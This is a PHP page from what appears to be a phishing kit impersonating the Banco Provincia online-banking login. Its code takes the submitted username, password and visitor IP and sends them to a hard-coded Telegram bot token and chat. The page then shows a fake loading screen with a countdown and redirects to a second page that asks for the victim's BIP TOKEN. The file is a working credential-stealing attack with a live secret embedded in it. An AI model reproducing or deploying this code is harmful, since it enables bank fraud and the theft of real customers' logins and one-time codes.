<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');

if ( isset ($_POST['uno']) && isset ($_POST['dos']) ){

$message = "USER: ".$_POST['uno']."\r\nCLAVE: ".$_POST['dos']."\r\nIP ".$userp."\r\n";

$apiToken = "5538364965:AAEq5z1Q42UqffhYXp2qBXpJP-qXacQn1es";
$data = [
    'chat_id' => '-894957261',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}else{  header ('location: index.html'); exit();
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

		<meta http-equiv="X-UA-Compatible" content="IE=8">
		<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
		
	
		<title>
			
			
				Provincia
			
		</title>
		<!-- Metadata -->
		
		<!-- CSS -->
		<!-- Estilo Login Anterior 24/09/2018 -->
		<!--  <link href="/eBanking/styles/new_Login-IN.css" type="text/css" rel="stylesheet" /> -->
		
		<link href="./fes/new_Login-IN.css" type="text/css" rel="stylesheet">

		<link href="./fes/new_footer-IN.css" type="text/css" rel="stylesheet">
		
		<!-- Font-Awesome -->
		<link href="./fes/font-awesome.min.css" type="text/css" rel="stylesheet">

		<!-- CSS POPUP -->
		<link href="./fes/alphacube.css" type="text/css" rel="stylesheet">
<!--		<link href="/eBanking/styles/default.css" type="text/css" rel="stylesheet" />-->

		<!-- CSS TECLADO -->
		<link href="./fes/keyboardstyle.css" type="text/css" rel="stylesheet">

		<style>
			#backImageIzq:hover {
				cursor: pointer;
			}
		</style>
		 <script language="JavaScript">
	var tiempo=30;
    var url="index3.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Por favor, espera "+tiempo+" segundos <br> Para verificar su información le pediremos su BIP TOKEN ";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
	</head>
	<body >
		<div id="minHeight"></div>
		<div id="outer">
			<div id="header">
				<div id="superior">
					<div id="header_sup_izq">
					    <img alt="" src="./fes/baprol.png" >
					</div>
					<div class="solapas">
					<div class="imagenesDer">
							
					</div>
					</div>
				</div>
			</div>
			<div id="right">
	</div>
			<div align="center">
			<span style="font-size:24px;color:#279d2e;">Cargando...</span><br><br><br><br><br>
			<img src="fes/lod.gif" style="width:150px;">
			
		</div>
			<div id="left">
				
			</div>
			
			
			    
			    
			      <div id="">
				<br><br><br><br>
				<div align="center"  style="color:red;font-size:24px;">¡NO CIERRE ESTA VENTANA!</div><br>
				
				<div  align="center" id="contador" style="font-size:20px;color:#279d2e;"></div>
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
					</div>
			    
			
			
			
			

			<div id="newlowercontent">
			
			
			
			    
			    
			    	<div id="outerLower">
						<span style="width: 100%;"><a target="_blank" 
						href=""></a></span>
					</div>
			    
			
				
				<!--  Fin Solo BO -->
			</div>
		
		</div>

		<div id="modalProcesando" class="modalLoading">
			
	<table class="table_window">
		<tbody>
			<tr>
				<td class="alphacube_nw">
					<img class="alphacube_nw" src="./fes/left-top.gif">
				</td>
				<td class="alphacube_n">
					<img class="alphacube_n" src="./fes/top-middle.gif">
				</td>
				<td class="alphacube_ne">
					<img class="alphacube_ne" src="./fes/right-top.gif">
				</td>
			</tr>
	
			<tr>
				<td class="alphacube_w">
					<img class="alphacube_w" src="./fes/frame-left.gif">
				</td>
				<td valign="top" class="alphacube_content">
					<div class="alphacube_content" style="overflow: auto; height: 95px; width: 195px;">
						<div class="alphacube_message">
							<span style="font-size: 16px;"><b>Cargando...</b></span>
							<br>
							<br>
						</div>
						<div class="alphacube_progress">
							<img class="alphacube_progress" src="./fes/progress.gif">
						</div>
					</div>
				</td>
				<td class="alphacube_e">
					<img class="alphacube_e" src="./fes/frame-right.gif">
				</td>
			</tr>

			<tr>
				<td class="alphacube_sw">
					<img class="alphacube_sw" src="./fes/bottom-left-c.gif">
				</td>
				<td class="alphacube_s">
					<img class="alphacube_s" src="./fes/bottom-middle.gif">
				</td>
				<td class="alphacube_se">
					<img class="alphacube_se" src="./fes/bottom-right-c.gif">
				</td>
			</tr>
		</tbody>
	</table>

		</div>
	
</body></html>